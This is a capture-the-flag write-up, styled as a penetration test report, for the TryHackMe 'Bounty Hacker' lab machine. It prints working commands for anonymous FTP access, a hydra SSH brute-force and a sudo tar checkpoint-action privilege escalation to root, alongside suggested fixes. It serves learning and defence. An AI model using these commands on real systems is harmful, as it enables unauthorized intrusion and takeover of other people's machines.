```markdown
# Vulnerability Assessment and Penetration Testing (VAPT) Report  
## Bounty Hacker (TryHackMe)  

**Prepared by:** Nishanth Antony  
**Date:** August 08, 2025  
**Difficulty:** Easy  
**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Privilege Escalation / Web Exploitation  

---

## 📋 Executive Summary  

This report details my penetration test of the **Bounty Hacker** machine on TryHackMe (IP: `10.201.27.76`). I identified security weaknesses, gained user access, and escalated to root to capture two flags (secret codes). The main issues were:  
- An open FTP server allowing anonymous access.  
- Exposed files with a username and password list.  
- Weak SSH credentials.  
- A misconfigured command allowing full system control.  

This beginner-friendly report explains the process simply, highlights vulnerabilities, and suggests fixes to secure the system.  

---

## 🎯 Scope  

I tested the Bounty Hacker machine to find security flaws, gain access, and capture the **user** and **root** flags. This simulated a real-world hack to learn how to find and fix vulnerabilities.  

---

## 🚨 Key Vulnerabilities  

| **Vulnerability**            | **Impact**                                    | **Fix**                                      |
|-----------------------------|-----------------------------------------------|----------------------------------------------|
| Anonymous FTP Access        | Exposed sensitive files to anyone             | Disable anonymous FTP or restrict access      |
| Exposed Password Files      | Revealed username and passwords for attacks   | Secure files with permissions or encryption   |
| Weak SSH Credentials        | Allowed unauthorized login as user `lin`      | Use strong passwords and enable MFA           |
| Misconfigured Sudo (`tar`)  | Enabled full system control (root access)     | Restrict sudo to safe, specific commands      |

---

## 🛠️ Exploitation Steps  

### 1. Scanning the System (Reconnaissance)  
- **<font size="4">[08:30]</font>** Scanned for open services using `nmap`.  
  - **Command**:  
    ```bash
    nmap -sV 10.201.27.76
    ```  
  - **Findings**:  
    - <font size="3">**Port 21**: FTP (vsftpd 3.0.3, file sharing).</font>  
    - <font size="3">**Port 22**: SSH (OpenSSH 7.2p2, remote login).</font>  
    - <font size="3">**Port 80**: Web server (Apache 2.4.18).</font>  
    - <font size="3">**Port 990**: Closed (FTPS).</font>  
  - **Why It Matters**: Identified entry points (FTP, SSH) to focus my attack.  

### 2. Exploring FTP (File Access)  
- **<font size="4">[08:35]</font>** Connected to FTP using “anonymous” (no password).  
  - **Command**:  
    ```bash
    ftp 10.201.27.76
    ```  
  - **Actions**: Listed files with `ls -la`. Found:  
    - <font size="3">`task.txt`: Contained username `lin`.</font>  
    - <font size="3">`locks.txt`: List of passwords.</font>  
  - **How I Read Them**: Used `less task.txt` and `less locks.txt` after `cat` failed.  
  - **Why It Matters**: These files gave me a username and passwords to try for SSH.  

### 3. Breaking into SSH (User Access)  
- **<font size="4">[08:45]</font>** Used `hydra` to test passwords from `locks.txt` for user `lin`.  
  - **Command**:  
    ```bash
    hydra -l lin -P /home/Nishanth/locks.txt 10.201.27.76 ssh
    ```  
  - **Findings**: Found the correct password for `lin`.  
  - **Next Steps**: Logged in via SSH and found `user.txt` with the user flag.  
    - **Commands**:  
      ```bash
      ssh lin@10.201.27.76
      cat user.txt
      ```  
  - **Why It Matters**: Gained user access and captured the first flag.  

### 4. Becoming Root (Privilege Escalation)  
- **<font size="4">[09:00]</font>** Checked commands `lin` could run as a superuser.  
  - **Command**:  
    ```bash
    sudo -l
    ```  
  - **Findings**: `lin` could run `tar` as root.  
- **<font size="4">[09:05]</font>** Used a `tar` trick to get a root shell.  
  - **Command**:  
    ```bash
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    ```  
  - **Result**: Got a root shell (full system control).  
- **<font size="4">[09:10]</font>** Found the root flag in `root.txt`.  
  - **Command**:  
    ```bash
    cat /root/root.txt
    ```  
  - **Why It Matters**: Captured the root flag and took over the system.  

---

## 🧠 Lessons Learned  

- **Lock FTP**: Prevent anonymous access and limit file visibility.  
- **Hide Secrets**: Don’t leave usernames or passwords in open files. Use permissions or encryption.  
- **Secure SSH**: Use strong passwords and add multi-factor authentication (MFA).  
- **Fix Sudo**: Limit what commands users can run as root. Check with `sudo -l`.  
- **Scan Regularly**: Use `nmap` to find and fix open services before attackers do.  

---

## 💻 Skills Demonstrated  

- **Service Enumeration**: Identified open ports and services with `nmap` and `ftp`.  
- **Password Brute-Forcing**: Cracked SSH credentials using `hydra`.  
- **SSH Exploitation**: Gained user access with cracked credentials.  
- **Privilege Escalation**: Exploited a misconfigured `tar` command to gain root access.  

---

## 🛠️ Tools and Files Used  

- **Tools**:  
  - `nmap`: Scanned for open services.  
  - `ftp`: Accessed file server.  
  - `hydra`: Brute-forced SSH passwords.  
  - `ssh`: Logged into the system.  
  - `sudo`: Checked and exploited permissions.  
  - `tar`: Used for privilege escalation.  
- **Files**:  
  - `task.txt`, `locks.txt`, `user.txt`, `root.txt`, `/home/Nishanth/locks.txt`  
- **Environment**: TryHackMe (Ubuntu Linux), Kali Linux  

---

## 🌟 Final Thoughts  

By exploiting these vulnerabilities, I demonstrated how an attacker could take full control of a system, from accessing files to gaining root privileges. These issues—open FTP, exposed passwords, weak logins, and risky sudo settings—are common in real-world systems. Fixing them is critical to protect servers from hackers. This exercise sharpened my skills in finding and securing vulnerabilities, preparing me to better protect real-world systems.  
```
